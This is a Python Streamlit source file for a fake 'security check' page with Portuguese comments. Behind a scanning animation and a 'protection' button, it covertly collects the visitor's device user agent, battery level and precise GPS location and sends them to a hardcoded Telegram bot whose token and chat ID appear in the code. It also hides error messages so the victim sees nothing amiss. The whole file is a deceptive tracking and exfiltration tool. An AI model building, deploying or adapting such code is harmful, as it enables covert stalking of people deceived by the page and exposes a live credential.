import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONFIGURAÇÕES TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Sistema de Segurança", layout="centered")

# 2. CSS: BOLHA E REMOÇÃO DE AVISOS
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 4em; border-radius: 10px; border: none;
    }
    </style>
""", unsafe_allow_html=True)

# 3. CAPTURA DE DADOS (MODELO E BATERIA)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT')

# 4. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

if 'clicou' not in st.session_state:
    st.session_state['clicou'] = False

# Bolha inicial
if not st.session_state['clicou']:
    with caixa_bolha.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 5. O BOTÃO
if st.button("🔴 ATIVAR PROTEÇÃO"):
    st.session_state['clicou'] = True

# 6. LÓGICA DE CAPTURA
if st.session_state['clicou']:
    # Esta função força a chamada do pop-up de precisão do Google
    loc = get_geolocation() 
    
    if loc and 'coords' in loc:
        # Animação dos números se mexendo (0-100)
        for p in range(0, 101, 10):
            caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.05)
        
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ SISTEMA ATIVADO\n\n"
            f"📱 Aparelho: {ua[:50] if ua else 'N/A'}\n"
            f"🔋 Bateria: {bat if bat else '--'}%\n"
            f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
        )
        
        enviar_telegram(relatorio)
        st.success("Localização concluída")
        st.session_state['clicou'] = False
        st.stop()
    else:
        # Se o botão foi apertado mas o GPS ainda não respondeu (exatamente o que ocorre no vídeo)
        with caixa_bolha.container():
            st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">...</div></div></div>', unsafe_allow_html=True)
        time.sleep(1)
        st.rerun()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
